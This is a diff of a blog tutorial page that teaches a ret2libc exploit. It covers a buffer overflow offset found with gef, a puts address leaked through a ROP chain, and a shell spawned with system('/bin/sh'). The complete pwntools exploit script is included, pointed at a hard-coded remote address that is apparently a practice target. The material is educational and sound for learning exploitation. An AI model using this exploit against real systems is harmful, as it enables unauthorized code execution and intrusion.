@@ -1,184 +1,236 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  
-    <title>pwn&gt; ret2libc by example :: REhex</title>
-  
-  <meta http-equiv="content-type" content="text/html; charset=utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="How to perform the attack against the binary with randomized addresses of libaries in memory - ret2libc &amp;amp; pwntools by example.
-" />
-<meta name="keywords" content="reverse-engineering, development, malware-analysis, re" />
-<meta name="robots" content="noodp" />
-<link rel="canonical" href="/posts/ret2libc/" />
+<html lang="en" dir="auto">
 
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>pwn&gt; ret2libc by example | reHex Ninja</title>
+<meta name="keywords" content="pwn, linux, pwntools, note" />
+<meta name="description" content="How to perform the attack against the binary with randomized addresses of libaries in memory - ret2libc &amp; pwntools by example.">
+<meta name="author" content="trib0r3">
+<link rel="canonical" href="https://rehex.ninja/posts/ret2libc/" />
+<link crossorigin="anonymous" href="/assets/css/stylesheet.min.c88963fe2d79462000fd0fb1b3737783c32855d340583e4523343f8735c787f0.css" integrity="sha256-yIlj/i15RiAA/Q&#43;xs3N3g8MoVdNAWD5FIzQ/hzXHh/A=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://rehex.ninja/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://rehex.ninja/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://rehex.ninja/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://rehex.ninja/apple-touch-icon.png">
+<link rel="mask-icon" href="https://rehex.ninja/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<meta name="generator" content="Hugo 0.92.0" />
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
 
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
 
+            .list {
+                background: var(--theme);
+            }
 
-<link rel="stylesheet" href="/assets/style.css">
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
 
-  <link rel="stylesheet" href="/assets/blue.css">
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
 
-
-
-<link rel="stylesheet" href="/style.css">
-
-
-<link rel="apple-touch-icon" href="/img/apple-touch-icon-192x192.png">
-
-  <link rel="shortcut icon" href="/favicon.ico">
-
-
-
-<meta name="twitter:card" content="summary" />
-
-  
-    <meta name="twitter:site" content="https://rehex.ninja" />
-  
-    <meta name="twitter:creator" content="" />
-
-
-
-<meta property="og:locale" content="en" />
-<meta property="og:type" content="article" />
-<meta property="og:title" content="pwn&gt; ret2libc by example">
-<meta property="og:description" content="How to perform the attack against the binary with randomized addresses of libaries in memory - ret2libc &amp;amp; pwntools by example.
-" />
-<meta property="og:url" content="/posts/ret2libc/" />
-<meta property="og:site_name" content="REhex" />
-
-  
-    <meta property="og:image" content="/favicon.ico">
-  
-
-<meta property="og:image:width" content="2048">
-<meta property="og:image:height" content="1024">
-
-
-  <meta property="article:published_time" content="2021-06-01 12:32:42 &#43;0200 CEST" />
-
-
-
-
-
-
-
-
-
-
-<meta name="google-site-verification" content="Bf1vRw0a3PdL80fr1mxdlmaJbpLwHdliGy9r3w2Qaec" />
-<meta property="og:title" content="pwn&gt; ret2libc by example" />
+    </style>
+</noscript><meta property="og:title" content="pwn&gt; ret2libc by example" />
 <meta property="og:description" content="How to perform the attack against the binary with randomized addresses of libaries in memory - ret2libc &amp; pwntools by example." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="/posts/ret2libc/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2021-06-01T12:32:42+02:00" />
-<meta property="article:modified_time" content="2021-06-01T12:32:42+02:00" /><meta property="og:site_name" content="REhex" />
+<meta property="og:url" content="https://rehex.ninja/posts/ret2libc/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-06-01T12:32:42&#43;02:00" />
+<meta property="article:modified_time" content="2021-06-01T12:32:42&#43;02:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="pwn&gt; ret2libc by example"/>
+<meta name="twitter:description" content="How to perform the attack against the binary with randomized addresses of libaries in memory - ret2libc &amp; pwntools by example."/>
 
 
-
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Posts",
+      "item": "https://rehex.ninja/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "pwn\u003e ret2libc by example",
+      "item": "https://rehex.ninja/posts/ret2libc/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "pwn ret2libc by example",
+  "name": "pwn ret2libc by example",
+  "description": "How to perform the attack against the binary with randomized addresses of libaries in memory - ret2libc \u0026amp; pwntools by example.\n",
+  "keywords": [
+    "pwn", "linux", "pwntools", "note"
+  ],
+  "articleBody": "How to perform the attack against the binary with randomized addresses of libaries in memory - ret2libc \u0026 pwntools by example.\n NOTICE I’m not very experienced in the “offensive RE” ~ pwns. If you will find some mistakes in my explainations, then please let me know in the comments :)\n Prerequisites  exploitable (linux) binary python3 + pwntools (I’m using it in virtualenv) GDB + gef  # quick install sudo apt install gdb python3 python3-pip # install gef (https://github.com/hugsy/gef) wget -O ~/.gdbinit-gef.py -q http://gef.blah.cat/py echo source ~/.gdbinit-gef.py  ~/.gdbinit # install pwntools in virtualenv (https://docs.pwntools.com/en/stable/) pip install virtualenv virtualenv -p python3 venv . ./venv/bin/activte pip install pwntools My exploitable binary have following properties:\ngef➤ checksec [+] checksec for 'binary' Canary : ✘ NX : ✓ PIE : ✘ Fortify : ✘ RelRO : Full Hunt for the exploitable code  This tutorial will focus only on binaries with enabled relocation, it will fully ignore the PIE or stack canaries.\n The easiest way to find the exploitable code is actually to play with the binary, learn about it’s background. It is worth noticing that exploitable functionality will be triggered from somewhere where binary interacts with the user (receive \u0026 parse packets, user input, configs)\nIn my case the binary have only 4 “input fields” and only one of them allows to overwrite the allocated buffer:\n// ida pseudo-code: int fill() { char buf[32]; // [rsp+0h] [rbp-20h] BYREF  memset(buf, 0, sizeof(buf)); printf(\"How much data do you want to store?\\n \") read(0, buf, 0x400uLL); // buffer can be overwritten  return printf(\"\\nEnjoy your %s\", buf); } buf can handle only 32 bytes, but read can read 400, so we should be to fully fill the buffer and overwrite the return address. Stack looks like that:\n+----------------+ | return addr |  Protip\nASM call  is contained from the 2 instructions: push $rip+1, jmp , so it saves the address of the next instruction and performs jump to the called function.\nret is analogical, it consists of pop \u0026 jmp\n Prove that you are in control Next natural step is to verify that we actually can control the rip registry, the easiest way to achieve that is to run it in gdb with gef installed and generate the pattern:\ngef➤ pattern create 60 [+] Generating a pattern of 60 bytes aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaa [+] Saved as '$_gef0'  Protip\nGenerated pattern is using readable characters which are containing unique set of characters which can be easily located in the string for identifying the offset of specified substring.\n Then just use generated payload as input data in potentially vulnerable functionality. In my case I had to navigate to the proper menu and paste the payload as choice option. As result the program crashed and gdb handled the exception:\n aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaa Enjoy your aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaa Program received signal SIGSEGV, Segmentation fault. [ Legend: Modified register | Code | Heap | Stack | String ] ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ──── $rax : 0x49 $rbx : 0x0 $rcx : 0x0 $rdx : 0x00007ffff7dd18c0 → 0x0000000000000000 $rsp : 0x00007fffffffe278 → \"faaaaaaagaaaaaaahaaa\\n\" $rbp : 0x6161616161616165 (\"eaaaaaaa\"?) $rsi : 0x00007fffffffbbb0 → \"Enjoy your aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaa\" $rdi : 0x1 $rip : 0x0000000000400eec →  ret $r8 : 0x49 $r9 : 0x3d $r10 : 0xffffffc3 $r11 : 0x246 $r12 : 0x00000000004006e0 →  xor ebp, ebp $r13 : 0x00007fffffffe370 → 0x0000000000000001 $r14 : 0x0 $r15 : 0x0 $eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification] $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ──── 0x00007fffffffe278│+0x0000: \"faaaaaaagaaaaaaahaaa\\n\" ← $rsp 0x00007fffffffe280│+0x0008: \"gaaaaaaahaaa\\n\" 0x00007fffffffe288│+0x0010: 0x0000000a61616168 (\"haaa\\n\"?) 0x00007fffffffe290│+0x0018: 0x0000000000401040 →  push r15 0x00007fffffffe298│+0x0020: 0x00007ffff7a05b97 →  mov edi, eax 0x00007fffffffe2a0│+0x0028: 0x0000000000000001 0x00007fffffffe2a8│+0x0030: 0x00007fffffffe378 → 0x00007fffffffe5eb → \"/tmp/binary\" 0x00007fffffffe2b0│+0x0038: 0x0000000100008000 ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ──── 0x400ee5  call 0x400670  0x400eea  nop 0x400eeb  leave → 0x400eec  ret [!] Cannot disassemble from $PC ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ──── [#0] Id 1, Name: \"binary\", stopped 0x400eec in fill (), reason: SIGSEGV ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ──── [#0] 0x400eec → fill() ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 0x0000000000400eec in fill () Bingo! Program crashed because it tried to jump \u0026 execute instructions under the invalid address. Now you can find the address which overwritten return pointer:\ngef➤ pattern offset $rsp [+] Searching '$rsp' [+] Found at offset 40 (little-endian search) likely [+] Found at offset 33 (big-endian search)  Protip\nWe can find the address in rsp, because processor failed to execute ret instruction. rip still points to problematic instruction.\n  Protip\nAs argument for pattern offset you can also provide the string or hex number:\ngef➤ pattern offset faaaaaaagaaaaaaahaa [+] Searching 'faaaaaaagaaaaaaahaa' [+] Found at offset 40 (big-endian search) gef➤ pattern offset 0x6161616161616166 [+] Searching '0x6161616161616166' [+] Found at offset 40 (little-endian search) likely [+] Found at offset 33 (big-endian search)  Save the found offset (40 in my case), we will need it later.\nDevelop the exploit (ret2libc) The ret2libc consists of several simple steps:\n Leak the libc function’s address Calculate the address of libc in memory Redirect the execution flow to the leaked libc function such as system to execute the /bin/sh   Notice!\nAll steps needs to be performed during single program execution (due to the randomization). For this you need to have 2 vulnerable functions or just call the vulnerable code twice ;)\n PWNtools: quick start We are going to start from loading binaries (binary and libc) into the pwntools:\nimport pwn p = pwn.process('./binary') #p = pwn.remote(\"138.68.182.108\", 30784) pwn.context(os='linux', arch='amd64') #pwn.context.log_level = 'debug' elf = pwn.ELF(\"./binary\") libc = pwn.ELF(\"./libc.so.6\")  Protip\nIf you want to perform this code remotely then uncomment pwn.remote (\u0026 comment pwn.process), for debug logs uncomment pwn.context.log_level = 'debug'.\n Now we can pretty easily use the binaries meta information such us stored symbols, etc.\nIt might happen that vulnerable code is stored behind some menus, for navigation through program you can use several functions:\np.recvuntil(\" \") # receive stdout until this substring p.recv(0xff) # receive n number of bytes p.recvline() # receive stdout until new line p.send(b'foo') # send bytes p.sendline(b'foo') # send 'foo\\n' (with new line character) # optionally use the timeout parameter to wait for output p.recv(0xff, timeout=0.5) Leak address So, now you managed to load the binary, execute it and navigate to vulnerable functionallity.\nNow it’s time to create the payload - the easiest way to achieve it is to use ROP module\nIn the code below I am constructing the ROP chain which will:\n Fill the buffer (32 bytes) Overwrite the saved base pointer on stack (8 bytes) Call puts to leak GOT puts address Redirect the execution flow to the same, vulnerable function (fill in my case) Joins the fill bytes with ROP chain Sends the payload  fill = b'A' * 40 rop = pwn.ROP(elf) rop.call(elf.plt[\"puts\"], [elf.got[\"puts\"]]) rop.call(elf.symbols[\"fill\"]) payload = b\"\".join([fill, rop.chain()]) p.sendline(payload)  Under the hood of rop.call\nIn different architectures functions are called using specific call conventions1. For example in linux x8664: 1st argument of function is always passed via rdi registry. If we want to to call the function with argument we need to make sure that argument value is stored in the mentioned registry.\nFor that we create the ROP chain which will:\n Jump to the code containing instructions taking the argument from stack and placing it in rdi (pop rdi). Take address to jump from stack and jump to it (ret).  In general rop.call chain will look like that:  (pwntools is capable of finding gadgets needed to call the function will all arguments).\n  PLT vs GOT2\n PLT - Procedure Linkage Table, contain stubs to jump to the target GOT - tables of the target addresses (resolved runtime)  You can find these values by yourself:\n$ objdump -D ./binary| grep puts 0000000000400650 : 400650: ff 25 52 19 20 00 jmpq *0x201952(%rip) # 601fa8  ... We can interpret above output as:\n PLT address = 0x400650 GOT entry = 0x601fa8   After sending such prepared payload to the program the stack should look like that:\n+----------------+ | ptr_plt_puts | Now we need to parse the output, this part is individual for each program. I really recommend enabling debugging output which will show transfered data.\n Protip - Enable Debug Mode\npwn.context.log_level = 'debug'  # parse leaked address raw_data = p.recvuntil('\\n') raw_data = raw_data.strip() # \\ raw_data = raw_data[-6:] # - skip unnecesary data leaked_puts = raw_data.ljust(8, b'\\x00') # fill missing bytes with zeroes leaked_puts = pwn.u64(leaked_puts)  Packing and Unpacking the bytes\npwntools contains built-in functions for packing and unpacking bytes - conversion of bytes between the strings and ints according to set environment with context function (endianness is set automatically).\n pwn.p64(0x4142424245464748) b'HGFEBBBA'  pwn.u64(b'HEXIFYIT') 6073483730898928968 # 0x5449594649584548  Run /bin/sh The “last” step consists of the following substeps:\n Calculate the address of libc in memory Calculate the address of system() function and its argument (\"/bin/sh\") Prepare the ropchain \u0026 pass it as argument   Ok, but why?\nYou might wondering here why not just call the system() directly in the previous step. It seems to be might simpler, than whole play with calling the same function once again.\nThe reason is simple: there is no system plt entry in our binary, so we can’t call it:\n$ objdump -D ./binary| grep 'system' # empty output We don’t have it in our binary, so we need to find it in the memory by tracing common functions - in our case puts.\n pwn.info(\"Stage 2, ret2shell\") # calculate offset, base address of the libc in the memory libc.address = leaked_puts - libc.symbols['puts'] # prepare the final payload rop = pwn.ROP(libc) rop.call(rop.find_gadget(['ret'])) # just for fixing padding, you might not need it rop.call(libc.symbols['system'], [next(libc.search(b\"/bin/sh\\x00\"))]) # with null-byte to make sure that we don't try to execute some /bin/sh appended with garbage like '/bin/shFEFE' which obviously doesn't exists in linux payload = b\"\".join([fill, rop.chain()]) p.sendline(payload) p.interactive() The last line (p.interactive()) spawns the interactive shell:\n$ ps PID TTY TIME CMD 26 ? 00:00:00 binary 27 ? 00:00:00 sh 28 ? 00:00:00 sh Full script import pwn #p = pwn.process('./binary') p = pwn.remote(\"138.68.182.108\", 30784) pwn.context(os='linux', arch='amd64') #pwn.context.log_level = 'debug' elf = pwn.ELF(\"./binary\") libc = pwn.ELF(\"./libc.so.6\") pwn.info(\"Stage 1, leak puts addr\") p.recvuntil(...) p.sendline(...) p.recv(...) # prepare payload fill = b'A' * 40 rop = pwn.ROP(elf) rop.call(elf.plt[\"puts\"], [elf.got[\"puts\"]]) rop.call(elf.symbols[\"fill\"]) payload = b\"\".join([fill, rop.chain()]) p.sendline(payload) p.recvuntil(\"Enjoy your \") # extract leaked puts address raw_data = p.recvuntil('\\n') raw_data = raw_data.strip() # \\ raw_data = raw_data[-6:] # - skip unnecesary data leaked_puts = raw_data.ljust(8, b'\\x00') # fill missing bytes with zeroes leaked_puts = pwn.u64(leaked_puts) pwn.success(f'Leaked puts: {leaked_puts:x}') pwn.info(\"Stage 2, ret2shell\") # calculate offset, base address of the libc in the memory libc.address = leaked_puts - libc.symbols['puts'] # prepare the final payload rop = pwn.ROP(libc) rop.call(rop.find_gadget(['ret'])) rop.call(libc.symbols['system'], [next(libc.search(b\"/bin/sh\\x00\"))]) payload = b\"\".join([fill, rop.chain()]) p.sendline(payload) pwn.success(\"Have fun!\") p.interactive() References   https://www.agner.org/optimize/calling_conventions.pdf ↩︎\n https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html ↩︎\n  ",
+  "wordCount" : "1864",
+  "inLanguage": "en",
+  "datePublished": "2021-06-01T12:32:42+02:00",
+  "dateModified": "2021-06-01T12:32:42+02:00",
+  "author":{
+    "@type": "Person",
+    "name": "trib0r3"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://rehex.ninja/posts/ret2libc/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "reHex Ninja",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://rehex.ninja/favicon.ico"
+    }
+  }
+}
+</script>
 </head>
-<body class="blue">
 
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
 
-<div class="container full headings--one-size">
+</script>
 
-  <header class="header">
-  <div class="header__inner">
-    <div class="header__logo">
-      <a href="/">
-  <div class="logo">
-    REhex
-  </div>
-</a>
-
-    </div>
-    
-      <div class="menu-trigger">menu</div>
-    
-  </div>
-  
-    <nav class="menu">
-  <ul class="menu__inner menu__inner--desktop">
-    
-      
-        
-          <li><a href="/tags">#tags</a></li>
-        
-      
-        
-          <li><a href="/about">About</a></li>
-        
-      
-        
-          <li><a href="/contact">Contact</a></li>
-        
-      
-      
-    
-
-    
-  </ul>
-
-  <ul class="menu__inner menu__inner--mobile">
-    
-      
-        <li><a href="/tags">#tags</a></li>
-      
-    
-      
-        <li><a href="/about">About</a></li>
-      
-    
-      
-        <li><a href="/contact">Contact</a></li>
-      
-    
-    
-  </ul>
-</nav>
-
-  
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://rehex.ninja" accesskey="h" title="reHex Ninja (Alt + H)">reHex Ninja</a>
+            <span class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://rehex.ninja/tags" title="#tags">
+                    <span>#tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://rehex.ninja/search" title="search (Alt &#43; /)" accesskey=/>
+                    <span>search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://rehex.ninja/archives" title="archives">
+                    <span>archives</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
 </header>
+<main class="main">
 
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://rehex.ninja">Home</a>&nbsp;»&nbsp;<a href="https://rehex.ninja/posts/">Posts</a></div>
+    <h1 class="post-title">
+      pwn&gt; ret2libc by example
+    </h1>
+    <div class="post-meta"><span title='2021-06-01 12:32:42 +0200 CEST'>June 1, 2021</span>&nbsp;·&nbsp;trib0r3&nbsp;|&nbsp;<a href="https://github.com/trib0r3/trib0r3.github.io/posts/ret2libc.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>
 
-  <div class="content">
-    
-<div class="post">
-  <h1 class="post-title">
-    <a href="/posts/ret2libc/">pwn&gt; ret2libc by example</a></h1>
-  <div class="post-meta">
-    
-      <span class="post-date">
-        2021-06-01 [Updated: 2021-06-01]
-      </span>
-    
-    
-  </div>
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
 
-  
-  <span class="post-tags">
-    
-    #<a href="/tags/pwn/">pwn</a>&nbsp;
-    
-    #<a href="/tags/linux/">linux</a>&nbsp;
-    
-    #<a href="/tags/pwntools/">pwntools</a>&nbsp;
-    
-    #<a href="/tags/note/">note</a>&nbsp;
-    
-  </span>
-  
+        <div class="inner"><ul>
+                <li>
+                    <a href="#prerequisites" aria-label="Prerequisites">Prerequisites</a></li>
+                <li>
+                    <a href="#hunt-for-the-exploitable-code" aria-label="Hunt for the exploitable code">Hunt for the exploitable code</a></li>
+                <li>
+                    <a href="#prove-that-you-are-in-control" aria-label="Prove that you are in control">Prove that you are in control</a></li>
+                <li>
+                    <a href="#develop-the-exploit-ret2libc" aria-label="Develop the exploit (ret2libc)">Develop the exploit (ret2libc)</a><ul>
+                        
+                <li>
+                    <a href="#pwntools-quick-start" aria-label="PWNtools: quick start">PWNtools: quick start</a></li></ul>
+                </li>
+                <li>
+                    <a href="#leak-address" aria-label="Leak address">Leak address</a></li>
+                <li>
+                    <a href="#run-binsh" aria-label="Run /bin/sh">Run /bin/sh</a></li>
+                <li>
+                    <a href="#full-script" aria-label="Full script">Full script</a></li>
+                <li>
+                    <a href="#references" aria-label="References">References</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
 
-  
-
-  
-
-  <div class="post-content"><div>
-        <p>How to perform the attack against the binary with randomized addresses of libaries in memory - ret2libc &amp; pwntools by example.</p>
+  <div class="post-content"><p>How to perform the attack against the binary with randomized addresses of libaries in memory - ret2libc &amp; pwntools by example.</p>
 <blockquote>
 <p><strong>NOTICE</strong> I&rsquo;m not very experienced in the &ldquo;offensive RE&rdquo; ~&gt; pwns. If you will find some mistakes in my explainations, then please let me know in the comments :)</p>
 </blockquote>
-<h2 id="prerequisites">Prerequisites<a href="#prerequisites" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h2 id="prerequisites">Prerequisites<a hidden class="anchor" aria-hidden="true" href="#prerequisites">#</a></h2>
 <ul>
 <li>exploitable (linux) binary</li>
 <li>python3 + pwntools (I&rsquo;m using it in virtualenv)</li>
@@ -204,7 +256,7 @@ NX                            : ✓
 PIE                           : ✘
 Fortify                       : ✘
 RelRO                         : Full
-</code></pre><h2 id="hunt-for-the-exploitable-code">Hunt for the exploitable code<a href="#hunt-for-the-exploitable-code" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+</code></pre><h2 id="hunt-for-the-exploitable-code">Hunt for the exploitable code<a hidden class="anchor" aria-hidden="true" href="#hunt-for-the-exploitable-code">#</a></h2>
 <blockquote>
 <p>This tutorial will focus only on binaries with enabled relocation, it will fully ignore the PIE or stack canaries.</p>
 </blockquote>
@@ -235,7 +287,7 @@ RelRO                         : Full
 <p>ASM <code>call &lt;func&gt;</code> is contained from the 2 instructions: <code>push $rip+1, jmp &lt;func&gt;</code>, so it saves the address of the next instruction and performs jump to the called function.</p>
 <p><code>ret</code> is analogical, it consists of <code>pop</code> &amp; <code>jmp</code></p>
 </blockquote>
-<h2 id="prove-that-you-are-in-control">Prove that you are in control<a href="#prove-that-you-are-in-control" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h2 id="prove-that-you-are-in-control">Prove that you are in control<a hidden class="anchor" aria-hidden="true" href="#prove-that-you-are-in-control">#</a></h2>
 <p>Next natural step is to verify that we actually can control the <code>rip</code> registry, the easiest way to achieve that is to run it in gdb with gef installed and generate the pattern:</p>
 <pre tabindex="0"><code class="language-assembly" data-lang="assembly">gef➤  pattern create 60
 [+] Generating a pattern of 60 bytes
@@ -315,7 +367,7 @@ gef➤  pattern offset 0x6161616161616166
 [+] Found at offset 33 (big-endian search)
 </code></pre></blockquote>
 <p>Save the found offset (40 in my case), we will need it later.</p>
-<h2 id="develop-the-exploit-ret2libc">Develop the exploit (ret2libc)<a href="#develop-the-exploit-ret2libc" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h2 id="develop-the-exploit-ret2libc">Develop the exploit (ret2libc)<a hidden class="anchor" aria-hidden="true" href="#develop-the-exploit-ret2libc">#</a></h2>
 <p>The ret2libc consists of several simple steps:</p>
 <ol>
 <li>Leak the libc function&rsquo;s address</li>
@@ -326,7 +378,7 @@ gef➤  pattern offset 0x6161616161616166
 <p><strong>Notice!</strong></p>
 <p>All steps needs to be performed during single program execution (due to the randomization). For this you need to have 2 vulnerable functions or just call the vulnerable code twice ;)</p>
 </blockquote>
-<h3 id="pwntools-quick-start">PWNtools: quick start<a href="#pwntools-quick-start" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h3 id="pwntools-quick-start">PWNtools: quick start<a hidden class="anchor" aria-hidden="true" href="#pwntools-quick-start">#</a></h3>
 <p>We are going to start from loading binaries (binary and libc) into the pwntools:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> pwn
 
@@ -353,7 +405,7 @@ p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</spa
 
 <span style="color:#75715e"># optionally use the timeout parameter to wait for output</span>
 p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">0xff</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.5</span>)
-</code></pre></div><h2 id="leak-address">Leak address<a href="#leak-address" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+</code></pre></div><h2 id="leak-address">Leak address<a hidden class="anchor" aria-hidden="true" href="#leak-address">#</a></h2>
 <p>So, now you managed to load the binary, execute it and navigate to vulnerable functionallity.</p>
 <p>Now it&rsquo;s time to create the payload - the easiest way to achieve it is to use <em>ROP</em> module</p>
 <p>In the code below I am constructing the ROP chain which will:</p>
@@ -433,7 +485,7 @@ leaked_puts <span style="color:#f92672">=</span> pwn<span style="color:#f92672">
 <span style="color:#ae81ff">6073483730898928968</span>
 <span style="color:#75715e"># 0x5449594649584548</span>
 </code></pre></div></blockquote>
-<h2 id="run-binsh">Run /bin/sh<a href="#run-binsh" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h2 id="run-binsh">Run /bin/sh<a hidden class="anchor" aria-hidden="true" href="#run-binsh">#</a></h2>
 <p>The &ldquo;last&rdquo; step consists of the following substeps:</p>
 <ol>
 <li>Calculate the address of libc in memory</li>
@@ -466,7 +518,7 @@ p<span style="color:#f92672">.</span>interactive()
    <span style="color:#ae81ff">26</span> ?        00:00:00 binary
    <span style="color:#ae81ff">27</span> ?        00:00:00 sh
    <span style="color:#ae81ff">28</span> ?        00:00:00 sh
-</code></pre></div><h2 id="full-script">Full script<a href="#full-script" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+</code></pre></div><h2 id="full-script">Full script<a hidden class="anchor" aria-hidden="true" href="#full-script">#</a></h2>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> pwn
 
 <span style="color:#75715e">#p = pwn.process(&#39;./binary&#39;)</span>
@@ -516,7 +568,7 @@ payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span
 p<span style="color:#f92672">.</span>sendline(payload)
 pwn<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;Have fun!&#34;</span>)
 p<span style="color:#f92672">.</span>interactive()
-</code></pre></div><h2 id="references">References<a href="#references" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+</code></pre></div><h2 id="references">References<a hidden class="anchor" aria-hidden="true" href="#references">#</a></h2>
 <section class="footnotes" role="doc-endnotes">
 <hr>
 <ol>
@@ -528,89 +580,194 @@ p<span style="color:#f92672">.</span>interactive()
 </li>
 </ol>
 </section>
-      </div></div>
-
-  
-  
-<div class="pagination">
-    <div class="pagination__title">
-        <span class="pagination__title-h">Read other posts</span>
-        <hr />
-    </div>
-    <div class="pagination__buttons">
-        
-        <span class="button previous">
-            <a href="/posts/scanf-and-hateful-dot/">
-                <span class="button__icon">←</span>
